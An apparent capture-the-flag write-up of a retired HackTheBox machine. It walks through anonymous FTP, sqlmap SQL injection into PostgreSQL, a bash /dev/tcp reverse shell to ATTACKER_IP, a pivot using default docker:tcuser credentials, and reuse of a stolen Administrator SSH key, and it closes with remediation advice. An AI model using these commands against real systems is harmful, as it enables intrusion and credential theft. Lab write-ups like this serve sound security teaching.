# Toolbox — SQLi → OS Shell (Postgres) → Container Pivot → Host SSH → Administrator Key → Administrator (Lab)

**Date:** 2025-10-19

---

## TL;DR

Anonymous FTP revealed a `docker-toolbox.exe` artifact and the site `admin.megalogistic.com`. By capturing the admin login request and using `sqlmap` against a PostgreSQL backend, I exploited a SQL injection to obtain an OS shell on the container. From there I recovered the user flag, pivoted to the host using `docker:tcuser` SSH credentials (container gateway), located `C:\Users\Administrator\.ssh\id_rsa`, and used that private key to SSH in as `Administrator`. All testing occurred on a retired HackTheBox VM in an isolated lab; artifacts are sanitized.

---

## Scope & permission

This assessment was performed on a **retired HackTheBox machine** in a lab I control. All commands, artifacts, and outputs in this document are sanitized for public release. **Do not run exploit code or use recovered keys against third‑party or production systems.**

---

## Environment & notable findings

* **Target:** `TARGET_IP` (certificate CN: `admin.megalogistic.com`)
* **Services discovered (sanitized):**

  * FTP (21) — FileZilla ftpd — anonymous FTP allowed (found `docker-toolbox.exe`)
  * HTTPS (443) — Apache/2.4.38 (Debian) — site `admin.megalogistic.com`
  * Windows services observed (SSH for Windows, SMB/RPC ports, WinRM‑like ports) — indicating a mixed/virtualized environment
* **Container evidence:** FTP artifact (`docker-toolbox.exe`) and container IPs observed from shells

---

## Tools used

`nmap`, `ftp` / FTP client, browser + Burp (to capture login POST), `sqlmap`, `nc` (netcat), basic shell utilities (`python3 -c`, `pty`), and `ssh`. Private keys and unredacted logs were retained offline.

---

## Short chain summary

1. `nmap` → discovered anonymous FTP and `docker-toolbox.exe` artifact.
2. Mapped the host to `admin.megalogistic.com` and captured the admin login POST.
3. `sqlmap` → confirmed PostgreSQL SQL injection, enumerated the `public.users` table and obtained a hashed admin password.
4. `sqlmap --os-shell` → spawned an OS shell and obtained a reverse shell back to the attacker.
5. Interactive shell → upgraded to PTY and retrieved `user.txt` from Postgres directories.
6. Identified container networking (e.g., `CONTAINER_IP` 172.17.0.2 and gateway 172.17.0.1).
7. SSH to host as `docker` using known `docker-toolbox` credentials (`docker:tcuser`) → accessed host filesystem (`C:\Users`).
8. Located `C:\Users\Administrator\.ssh\id_rsa`, copied the private key out securely (kept private).
9. `ssh -i id_rsa administrator@TARGET_IP` → authenticated as `Administrator` and captured `root.txt`.

---

## Detailed steps (sanitized, reproducible)

### 1) Port scan

```bash
nmap -p- -sCV -T4 --open -oA recon --stats-every 5s TARGET_IP
```

The scan revealed anonymous FTP, HTTPS (admin portal), and several Windows ports — signalling a mixed or virtualized environment.

### 2) Anonymous FTP & artifact discovery

```text
ftp TARGET_IP
# login: anonymous
# password: (blank)
ls -la
```

**Found:** `docker-toolbox.exe` in the FTP root — a strong hint of Docker tooling and a potential pivot vector.

### 3) Map hostname & capture login

Add an `/etc/hosts` entry so `admin.megalogistic.com` resolves locally:

```bash
echo "TARGET_IP admin.megalogistic.com" | sudo tee -a /etc/hosts
```

Use a browser with Burp Suite to capture the admin login POST request and save it as `login.req` for `sqlmap`.

### 4) SQLi discovery & enumeration with `sqlmap`

Initial discovery and DB enumeration:

```bash
sqlmap -r login.req --batch --dbs -o
```

Sanitized results showed a **PostgreSQL** backend. After enumerating schemas and tables, `public.users` was found and dumped:

```bash
sqlmap -r login.req -D public --tables --batch
sqlmap -r login.req -D public -T users --dump --batch
```

Result: `users` table contained a single row: `username = admin`, `password = <hashed>`.

### 5) `sqlmap` OS shell → reverse shell (lab‑only)

Using `sqlmap`’s interactive OS shell (`--os-shell` or `--os-pwn`) I executed commands to spawn a reverse shell back to the attacker.

On attacker (listener):

```bash
nc -lvnp LPORT
```

From `sqlmap`’s OS shell (lab):

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'
```

After connection:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Result: interactive shell on the database/container host.

### 6) Locate user flag & observe container network

From the shell, I searched typical Postgres paths:

```bash
cd /var/lib/postgresql
ls -la
# found user flag
cat user.txt
```

I inspected networking to determine container and host addresses:

```bash
ifconfig || ip a
# saw container IP (e.g., 172.17.0.2) and gateway 172.17.0.1
```

### 7) Pivot to host via known `docker-toolbox` creds

Documentation/notes that accompanied `docker-toolbox.exe` suggested the credentials `docker:tcuser`.

From a reachable system (able to reach the container gateway):

```bash
ssh docker@172.17.0.1
# password: tcuser
```

This provided SSH access to the host VM as `docker`. Once on the host, I inspected Windows user folders (mounted or accessible via the host filesystem):

```bash
ls /c/Users
ls /c/Users/Administrator/.ssh
# found id_rsa
```

### 8) Retrieve Administrator private key & use it (lab‑only)

I copied `id_rsa` securely to the attacker machine (out of band). Locally, set strict permissions and connect:

```bash
chmod 600 id_rsa
ssh -i id_rsa administrator@TARGET_IP
```

Authentication succeeded and I retrieved `root.txt` from `C:\Users\Administrator\Desktop`.

---

## Impact

Full host compromise: SQL injection → OS command execution on DB/container → pivot to host via Docker/tooling credentials → discovery and reuse of Administrator private key → Administrator remote access. This chain enables data exfiltration, persistence, and lateral movement.

---

## Remediation (prioritized)

1. **Fix SQL injection:** use parameterized queries / prepared statements and validate all input. Disable stacked queries where possible.
2. **Remove or restrict anonymous FTP:** do not expose artifacts such as `docker-toolbox.exe` publicly; monitor FTP uploads and access.
3. **Avoid storing keys in user directories:** adopt proper key management and rotate keys that may have been exposed.
4. **Segregate containers from host management:** do not allow container bridge IPs to grant host access; enforce network isolation and restrict SSH to trusted management networks.
5. **Harden SSH & key usage:** enforce strict permissions, use passphrases for private keys, and log/alert on new key usage.
6. **Monitor for anomalous database activity:** detect unusual queries, exports, or use of automated SQLi tooling.

---

## Appendix / Notes

* All artifacts and commands are **sanitized** and were executed in an isolated lab environment.
* This writeup documents an attack chain intended for defensive awareness and remediation guidance only.
